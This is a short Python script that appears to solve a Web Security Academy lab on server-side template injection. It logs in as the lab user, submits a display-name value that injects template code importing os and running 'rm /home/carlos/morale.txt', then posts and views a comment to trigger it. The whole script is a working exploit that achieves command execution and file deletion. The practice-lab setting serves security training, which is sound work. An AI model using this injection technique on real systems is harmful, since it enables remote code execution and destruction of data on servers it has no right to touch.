from web_security_academy.core.logger import logger


def solve_lab(session):
    session.login("wiener", "peter")
    csrf = session.get_csrf_token("/my-account", n=2)

    data = {
        "blog-post-author-display": "user.name }} {% import os %} {{ os.system('rm /home/carlos/morale.txt')",
        "csrf": csrf,
    }
    session.post_path("/my-account/change-blog-post-author-display", data=data)

    logger.info(
        "Changed blog post author display (preferred name) using the following data:"
    )
    logger.info(data)

    csrf = session.get_csrf_token("/post?postId=1")
    data = {"csrf": csrf, "postId": 1, "comment": "hello"}
    session.post_path("/post/comment", data=data)
    logger.info("Posted a comment on a blog post")

    session.get_path("/post?postId=1")
    logger.info("Visited said blog post")
